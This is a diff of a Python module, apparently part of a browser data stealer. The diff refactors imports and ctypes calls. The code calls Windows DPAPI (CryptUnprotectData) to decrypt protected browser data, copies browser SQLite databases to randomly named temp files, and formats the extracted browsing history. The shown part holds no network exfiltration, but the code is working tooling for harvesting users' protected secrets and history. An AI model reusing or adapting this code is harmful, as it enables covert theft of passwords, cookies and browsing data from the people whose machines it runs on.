@@ -2,14 +2,15 @@
 
 import os
 import shutil
-from subprocess import Popen
+import random
+import ctypes
+import subprocess
+from ctypes import wintypes
 from base64 import b64decode
 from datetime import datetime
 from string import ascii_lowercase
-from random import choice, randint
-from json import loads as json_loads, load
 from sqlite3 import connect as sql_connect
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from json import loads as json_loads, load
 try:
 	from Crypto.Cipher import AES
 except ImportError:
@@ -18,10 +19,10 @@ except ImportError:
 
 # DATA BLOB
 
-class DATA_BLOB(Structure):
+class DATA_BLOB(ctypes.Structure):
 	_fields_ = [
 		('cbData', wintypes.DWORD),
-		('pbData', POINTER(c_char))
+		('pbData', ctypes.POINTER(ctypes.c_char))
 	]
 
 
@@ -30,23 +31,23 @@ class DATA_BLOB(Structure):
 def GetData(blob_out):
 	cbData = int(blob_out.cbData)
 	pbData = blob_out.pbData
-	buffer = c_buffer(cbData)
-	cdll.msvcrt.memcpy(buffer, pbData, cbData)
-	windll.kernel32.LocalFree(pbData)
+	buffer = ctypes.c_buffer(cbData)
+	ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
+	ctypes.windll.kernel32.LocalFree(pbData)
 	return buffer.raw
 
 
 # Decrypt bytes using DPAPI
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
-	buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-	buffer_entropy = c_buffer(entropy, len(entropy))
+	buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
+	buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
 	blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
 	blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
 	blob_out = DATA_BLOB()
 
-	if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
-		None, 0x01, byref(blob_out)):
+	if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None,
+		None, 0x01, ctypes.byref(blob_out)):
 		return GetData(blob_out)
 
 
@@ -60,7 +61,7 @@ NanoSeconds = 10000000
 
 # Change encoding to UTF8
 
-Popen('@chcp 65001 1>nul', shell=True)
+subprocess.Popen('@chcp 65001 1>nul', shell=True)
 
 
 # Get browsers install path
@@ -136,7 +137,7 @@ def FetchDataBase(target_db, sql=''):
 	if not os.path.exists(target_db):
 		return []
 
-	tmpDB = os.getenv('TEMP') + 'info_' + ''.join(choice(ascii_lowercase) for i in range(randint(10, 20))) + '.db'
+	tmpDB = os.getenv('TEMP') + 'info_' + ''.join(random.choice(ascii_lowercase) for i in range(random.randint(10, 20))) + '.db'
 	shutil.copy2(target_db, tmpDB)
 	conn = sql_connect(tmpDB)
 	cursor = conn.cursor()
@@ -348,3 +349,4 @@ def GetFormattedHistory():
 		.format(history['hostname'], history['title'], history['visits'], history['expires']))
 
 	return fmtHistory
+
